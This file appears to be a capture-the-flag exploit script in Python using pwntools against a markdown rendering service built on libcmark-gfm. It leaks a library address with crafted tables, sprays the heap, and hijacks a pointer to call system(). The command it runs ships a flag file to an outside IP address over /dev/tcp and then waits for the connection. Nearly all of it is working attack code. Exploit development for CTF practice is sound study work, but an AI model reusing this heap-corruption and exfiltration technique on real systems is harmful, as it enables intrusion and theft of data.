#!/usr/bin/env python3

from pwn import *
import requests
import itertools, bisect
from time import sleep

libc = ELF('./libc-2.31.so')
libgfm = ELF('../deploy/app/libs/libcmark-gfm.so.0.29.0.gfm.2')
libgfm_ext = ELF('../deploy/app/libs/libcmark-gfm-extensions.so.0.29.0.gfm.2')

url = 'http://127.0.0.1:56925'
LHOST, LPORT = '143.248.235.34', 65432


def targlen(l):
    if l % 3 == 0:
        l -= 1
    return l * 2 // 3 - 1

def clr(c):
    if isinstance(c, int):
        c = bytes([c])
    if c == b'c':
        return b':-:'
    elif c == b'l':
        return b':--'
    elif c == b'r':
        return b'--:'
    assert False

leak_ctr = 0
if 'Nope!' != requests.get(url + '/chal/leak').text:
    leak_ctr = 5

# Step 1. Leak
while leak_ctr < 5:
    try:
        res = requests.post(url + '/reload')
    except requests.exceptions.ConnectionError:
        pass
    
    for i in range(10):
        try:
            requests.get(url + '/')
        except requests.exceptions.ConnectionError:
            sleep(0.2)
        else:
            break
    
    code = ''

    SIZE_FILL = 0x100
    code += '|'
    code += 'Z'*0x637b0 + '|'
    for i in range(SIZE_FILL-2):
        code += f'{i}|'
    code += 'B'*0x42 + '|\n'
    code += '|' + '-|' * SIZE_FILL + '\n\n'

    SIZE = 0x1988
    code += '|'
    for i in range(SIZE):
        code += f'{i}|'
    code += '\n'

    markers = ['--'] * (0x10000 + SIZE)
    markers[0x3690] = ':-'
    for i in range(0x6c, 0xa8):
        markers[0x3740 + i] = ":-"
    code += '|' + '|'.join(markers) + '|\n\n'

    try:
        res = requests.post(
            url + '/render',
            data=code,
            headers={'Content-Type': 'text/markdown'},
            timeout=60
        ).content
    except requests.exceptions.Timeout:
        log.warning('Leak failed (no response in 60s), retry...')
        continue

    leakidx = res.find(b'l'*(0xa8-0x6c))
    if leakidx < 0:
        log.warning('Leak failed (marker not found), retry')
        continue
    leakidx += 0xa8-0x6c
    if res[leakidx+6:leakidx+11] != b'</th>':
        log.warning('Leak failed (addr leak len < 6), retry...')
        continue
    leak_addr = u64(res[leakidx:leakidx+6]+b'\0\0')

    try:
        requests.post(url + '/chal/proof_of_leak', data=str(leak_addr))
    except requests.exceptions.ConnectionError:
        pass
    leak_ctr += 1
    log.success(f'leak counter: {leak_ctr}')


# Step 2. Pop shell
for i in range(10000):
    log.info(f'Try {i}')
    libc.address = 0
    libgfm.address = 0
    libgfm_ext.address = 0
    try:
        res = requests.post(url + '/reload')
    except requests.exceptions.ConnectionError:
        pass
    
    for i in range(10):
        try:
            leak_addr = int(requests.get(url + '/chal/leak').text, 16)
        except requests.exceptions.ConnectionError:
            sleep(0.2)
        else:
            break
    
    libgfm.address = leak_addr - libgfm.sym['CMARK_ARENA_MEM_ALLOCATOR']
    assert libgfm.address & 0xfff == 0
    log.success(f'libcmark-gfm : {libgfm.address:#014x}')
    libc.address = libgfm.address + 0x1582000
    log.info (f'libc : {libc.address:#014x}')
    libgfm_ext.address = libgfm.address - 0xc000
    log.info (f'libcmark-gfm-ext : {libgfm_ext.address:#014x}')
    arena_base = libgfm_ext.address - 0x14000
    log.info (f'arena base : {arena_base:#014x}')
    
    if set(p64(libc.sym['system'])[:6]) & set(b'\x00\x0a\x0d\\|'):
        log.warning('Banned char present in system addr, retry')
        continue
    
    try:
        p64(libc.sym['system'])[:6].decode('utf-8')
    except UnicodeDecodeError:
        log.warning('Non-UTF8 system addr, retry')
        continue
    
    """
    curbase, cursz = arena_base, 0x400000
    for i in range(5):
        oldbase, curbase = curbase, curbase - cursz - 0x1000
        log.info(f'arena #{i}: {curbase:#014x} ~ {oldbase:#014x}')
        cursz = cursz + cursz // 2
    """

    """
    0x7f47cb0dd000 top
    0x7f47cacdc000 arena 0 0x0400000
    0x7f47ca6db000 arena 1 0x0600000 <- sprayed here
    0x7f47c9dda058 strbuf.ptr
    0x7f47c9dda050 strbuf.mem
    0x7f47c9dda000 arena 2 0x0900000 <- overwrite target
    0x7f47c9dd4308 ALIGNMENT (len 8)
    0x7f47c9059000 arena 3 0x0d80000 <- sniping region
    0x7f47c7c18000 arena 4 0x1440000
    """
    
    spray_base = arena_base
    spray_base -= 0x401000
    spray_base -= 0x601000
    spray_base -= 0x901000
    spray_base -= 0xd81000
    spray_base += 0x18 + 0x68
    spray_range = [spray_base + i * 0x68 for i in range(0x2471f - 0x3445)]
    log.info(f'spray range : {spray_range[0]:#014x} ~ {spray_range[-1]:#014x}')
    for hiword in itertools.product([b'c', b'l', b'r'], repeat=2):
        hiword_p16 = b''.join(hiword)
        cmd = u64(p16(0x6c72) + hiword_p16 + p32(libgfm.sym['CMARK_ARENA_MEM_ALLOCATOR'] >> 32))
        cmd -= 2
        sidx = bisect.bisect(spray_range, cmd) - 1
        if sidx < 0:
            continue
        ofs = cmd - spray_range[sidx]
        if ofs <= 0x70:
            break
    else:
        log.warning('Not in range, retry')
        continue
    
    log.success(f'Snipe Index : {sidx}')
    log.success(f'Snipe Address : {cmd:#014x}')
    
    code = b''
    arr = [b'']*0x24720
    
    arr[0x3444] = b'z'*targlen(0x8 + ofs)
    arr[-1] = b'z'*targlen(0x78 - ofs)
    
    snipe = f'bash -c "cat ../flag >&/dev/tcp/{LHOST}/{LPORT}";#'.encode('ascii')
    snipe = b'aa' + snipe.ljust(0x7282-0x6c72, b'a')
    snipe += p64(libc.sym['system'])[:6]
    arr[0x3445 + sidx] = snipe
    
    code += b'|' + b'|'.join(arr) + b'|\n'
    
    markers = [b'-'] * 0x14720
    
    markers[0x5d50] = clr(0x72)
    markers[0x5d51] = clr(0x72)
    markers[0x5d52] = clr(hiword[0])
    markers[0x5d53] = clr(hiword[1])
    
    markers[0x5d58] = clr(0x72)
    markers[0x5d59] = clr(0x6c)
    markers[0x5d5a] = clr(hiword[0])
    markers[0x5d5b] = clr(hiword[1])
    
    code += b'|' + b'|'.join(markers) + b'|\n\n'
    
    try:
        requests.post(
            url + '/render',
            data=code,
            headers={'Content-Type': 'text/markdown'},
            timeout=30
        )
    except requests.exceptions.Timeout:
        log.success('Exploit request timed out, enjoy your flag!')
    else:
        log.warning('Exploit request not timed out, retry')
        continue
    
    l = listen(LPORT)
    conn = l.wait_for_connection()
    print(conn.readall())
    break
